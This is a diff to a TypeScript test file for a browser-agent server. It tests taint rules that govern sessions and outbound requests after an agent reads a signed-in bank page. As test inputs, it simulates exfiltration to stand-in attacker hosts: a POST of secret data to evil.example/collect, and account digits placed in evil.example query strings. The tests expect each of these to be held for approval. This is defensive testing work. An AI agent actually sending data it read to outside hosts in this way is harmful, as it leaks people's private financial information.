@@ -6,6 +6,7 @@ import { ROUTES, TOOLS } from "@crossbar/shared";
 import { startTestApp, sleep, type FakeTab, type FakePool } from "./helpers.ts";
 import { HUMAN_ONLY, mcpTools } from "../src/capabilities.ts";
 import { UNUSED_REVOKE_MS } from "../src/tokens.ts";
+import { setSetting } from "../src/db.ts";
 import { classify, carriesData, TRIGGER_WINDOW_MS } from "../src/agent.ts";
 
 type T = Awaited<ReturnType<typeof startTestApp>>;
@@ -242,6 +243,41 @@ describe("server security rules", () => {
     assert.deepEqual([own.verdict, own.rule], ["allow", "page_background"]);
     const leak = tab.simulate({ method: "POST", url: "https://evil.example/collect", resourceType: "XHR", postData: "x=secret+stuff+read+while+signed+in" });
     assert.deepEqual([leak.verdict, leak.rule], ["hold", "taint_exit"]);
+  });
+
+  test("ADR 0033: after a signed-in read, sites with the person's login keep it; strict mode opens new sites anonymously, never asking for a login", async () => {
+    t.services.sites.set("alice", { pattern: "bank.example", level: "read_as_you" }, "user");
+    t.services.sites.set("alice", { pattern: "shop.example", level: "read_as_you" }, "user");
+    pool.pages.set("https://bank.example/", { content: "balance for account ending 4410 is 1203 dollars and 17 cents" });
+    pool.pages.set("https://shop.example/rfq", { content: "quotes" });
+    const c = await t.mcpClient(t.token("alice", "act"));
+    await c.call("open", { url: "https://bank.example/" });
+    await c.call("read");
+    // Live (made-in-china after Chase): it used to open anonymously and ask for a login, again and again.
+    const shop = await c.call("open", { url: "https://shop.example/rfq" });
+    assert.equal((shop.data as { profile: string }).profile, "signed_in", JSON.stringify(shop));
+    // The session works there now, query strings included.
+    assert.equal((await c.call("open", { url: "https://shop.example/rfq?page=2" })).state, "ok");
+    // Unchanged: a site without the person's login opens anonymously; data in the address to a new site asks.
+    assert.equal(((await c.call("open", { url: "https://news.example/" })).data as { profile: string }).profile, "anonymous");
+    assert.equal((await c.call("open", { url: "https://evil.example/?q=balance+4410" })).state, "pending_approval");
+    // finish closes the pages; what was read still counts.
+    assert.equal((await c.call("finish")).state, "ok");
+    assert.equal((await c.call("open", { url: "https://evil2.example/?q=balance+4410" })).state, "pending_approval");
+
+    // Strict mode: new sites open anonymously, and a login wall there is explained, not handed to a person.
+    setSetting(t.services.db, "alice", "strictTaint", "1");
+    pool.pages.set("https://shop2.example/", { title: "Sign in", facts: { hasPasswordField: true, textLength: 200 } });
+    t.services.sites.set("alice", { pattern: "shop2.example", level: "read_as_you" }, "user");
+    const s2 = await t.mcpClient(t.token("alice", "act"));
+    await s2.call("open", { url: "https://bank.example/" });
+    await s2.call("read");
+    const before = t.services.tickets.listOpen("alice").filter((x) => x.kind === "challenge").length;
+    const r = await s2.call("open", { url: "https://shop2.example/" });
+    assert.equal(r.state, "denied", JSON.stringify(r));
+    assert.match(String(r.reason), /without the person's login.*strict mode/);
+    assert.equal(t.services.tickets.listOpen("alice").filter((x) => x.kind === "challenge").length, before, "a login ticket on the anonymous profile");
+    setSetting(t.services.db, "alice", "strictTaint", null);
   });
 
   test("ADR 0031: the page's own requests pass until the agent acts on the page; after that, send/pay/delete still ask", async () => {
